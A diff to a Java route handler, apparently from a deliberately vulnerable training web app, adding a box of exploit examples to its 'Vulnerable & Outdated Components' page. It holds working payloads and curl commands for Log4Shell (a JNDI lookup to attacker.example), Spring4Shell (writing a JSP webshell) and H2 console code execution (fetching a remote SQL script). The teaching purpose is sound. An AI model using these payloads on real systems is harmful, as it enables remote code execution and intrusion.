@@ -61,8 +61,23 @@ public class VulnerableComponentsHandler implements IRouteHandler {
             </div>
             """.formatted(rows);
 
+        String exploits = TemplateEngine.exploitBox(new String[][]{
+            {"Log4Shell (CVE-2021-44228)", "${jndi:ldap://attacker.example/x}",
+             "Log any user-controlled string (e.g. User-Agent header) with Log4j 2.14.1 to trigger remote class loading.",
+             null,
+             "curl -s http://target/ -H 'User-Agent: ${jndi:ldap://attacker.example/x}'"},
+            {"Spring4Shell PoC", "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
+             "Send this as a query param to a Spring MVC endpoint on JDK 9+ to write a JSP webshell via the access log valve.",
+             null,
+             "curl -s 'http://target/endpoint?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di'"},
+            {"H2 Console RCE", "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/cmd.sql'",
+             "An unauthenticated H2 console accepts JDBC URLs with INIT scripts — runs arbitrary SQL on connect.",
+             null,
+             "curl -s -X POST http://target/h2-console/login.do -d \"url=jdbc:h2:mem:testdb;INIT=RUNSCRIPT+FROM+'http://attacker/cmd.sql'&user=sa&password=\""},
+        });
+
         String content = TemplateEngine.vulnerabilityBadge("A06", "Vulnerable & Outdated Components")
-            + info + table;
+            + info + exploits + table;
         res.getWriter().write(TemplateEngine.page("Vulnerable Components", content, true));
     }
 }
